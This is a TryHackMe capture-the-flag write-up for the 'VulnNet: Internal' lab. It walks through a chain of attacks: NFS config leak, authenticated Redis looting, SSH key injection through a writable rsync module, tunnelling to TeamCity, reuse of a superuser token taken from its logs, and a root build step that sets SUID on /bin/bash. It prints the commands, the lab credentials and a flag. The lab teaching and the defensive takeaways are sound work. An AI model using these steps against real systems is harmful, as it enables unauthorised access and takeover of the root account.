# 🌐 VulnNet: Internal

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `internal.thm` |
| **OS** | Ubuntu 18.04 |
| **Attack Surface** | NFS export leaks Redis password → Redis keys leak rsync credentials → SSH key injection via rsync |
| **Privesc** | SSH tunnel to TeamCity → superuser token in logs → malicious build step → SUID bash → root |

VulnNet: Internal is a service-chaining box. An NFS export of `/opt/conf` leaks the Redis config, which contains the authentication password. Redis itself holds base64-encoded rsync credentials in a key. rsync allows listing and writing to `sys-internal`'s home directory — public key injection enables SSH access. TeamCity is running on an internal port; tunnelled in and authenticated with the superuser token from logs, a malicious build step SUIDs `/bin/bash`.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 internal.thm -oA internal-tcp-scan
```

```
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
6379/tcp open  redis
```

### SMB Enumeration

```bash
smbclient -L //internal.thm -U guest
# shares: print$, shares (VulnNet Business), IPC$

smbclient //internal.thm/shares -U guest
# /data/data.txt, /data/business-req.txt, /temp/services.txt
```

Content is informational only — no direct credentials.

### NFS Export

```bash
showmount -e internal.thm
# Export list: /opt/conf *

mount -t nfs internal.thm:/opt/conf /tmp/nfs
```

The export contains `redis/redis.conf`:

```
requirepass "B65Hx562F@ggAZ@F"
```

---

## 💀 Initial Access — Redis → rsync → SSH Key Injection

### Redis Enumeration

```bash
redis-cli -h internal.thm -a 'B65Hx562F@ggAZ@F'
keys *
# marketlist, int, "internal flag", authlist, tmp

get "internal flag"
# THM{ff8e518addbbddb74531a724236a8221}

LRANGE authlist 0 -1
# QXV0aG9yaXphdGlvbi...== (base64 repeated)
```

Decoded authlist value:

```bash
echo "QXV0aG9yaXpha..." | base64 -d
# Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

### rsync SSH Key Injection

```bash
rsync rsync://rsync-connect@internal.thm
# files  Necessary home interaction

rsync --list-only rsync://rsync-connect@internal.thm/files/sys-internal/.ssh/
# authorized_keys readable/writable

# Inject attacker's public key
rsync --password-file=pw.txt -av ./id_rsa.pub \
  rsync://rsync-connect@internal.thm/files/sys-internal/.ssh/authorized_keys
```

```bash
ssh -i id_rsa sys-internal@internal.thm
# sys-internal@vulnnet-internal:~$
```

---

## 🔁 Privilege Escalation — sys-internal → root

### TeamCity on Internal Port

```bash
ps auxf | grep -i team
# /TeamCity/bin/... running as root on port 8111
```

Create an SSH local port forward to reach it:

```bash
ssh -i id_rsa sys-internal@internal.thm -L 127.0.0.1:8111:127.0.0.1:8111
```

### Superuser Token from Logs

```bash
cat /TeamCity/logs/* | grep -i auth
# [TeamCity] Super user authentication token: 8446629153054945175
```

Login at `http://localhost:8111` with an empty username and the token as the password.

### Malicious Build Step

Created a project and build configuration in TeamCity. Added a Command Line build step with the custom script:

```
chmod +s /bin/bash
```

Ran the build — step executed as root (TeamCity runs as root on this box):

```bash
ls -lah /bin/bash
# -rwsr-sr-x 1 root root /bin/bash

/bin/bash -p
# bash-4.4# id
# euid=0(root)
```

---

## 🗺️ Attack Chain

```
[NFS /opt/conf export]
    redis.conf → password: B65Hx562F@ggAZ@F
          │
          ▼
[Redis — authenticated]
    authlist key → base64 decode → rsync password: Hcg3HP67@TW@Bc72v
          │
          ▼
[rsync — sys-internal home]
    Write authorized_keys → SSH as sys-internal
          │
          ▼
[TeamCity — port 8111 via SSH tunnel]
    Superuser token in /TeamCity/logs → authenticated
    Build step: chmod +s /bin/bash → SUID bash → root
```

---

## 📌 Key Takeaways

- NFS exports with world-readable config files are a silent credential leak; restrict NFS exports to specific trusted hosts and audit what's under the exported path
- Redis with no authentication (or a weak password) exposed internally is a high-risk finding — it frequently stores session tokens, credentials, or other sensitive data
- rsync modules with write access to SSH directories allow trivial key injection; always audit rsync module permissions and exposed paths
- CI/CD systems (TeamCity, Jenkins, GitLab CI) running as root are a critical misconfiguration — they're effectively a root shell waiting to be triggered

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Discovery | Network Share Discovery | [T1135](https://attack.mitre.org/techniques/T1135) |
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Privilege Escalation | Abuse Elevation Control Mechanism | [T1548](https://attack.mitre.org/techniques/T1548) |

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `smbclient` | Anonymous SMB share enumeration |
| NFS mount | Access /opt/conf export to retrieve redis.conf |
| `redis-cli` | Authenticate and enumerate Redis keys |
| `rsync` | List and write to sys-internal's home directory |
| `ssh` | Login via injected public key and port forward to TeamCity |

## 🚩 Flags

<details>
<summary><code>internal.flag</code></summary>

`THM{ff8e518addbbddb74531a724236a8221}`

</details>

<details>
<summary><code>user.txt</code></summary>

`TBD`

</details>

<details>
<summary><code>root.txt</code></summary>

`TBD`

</details>
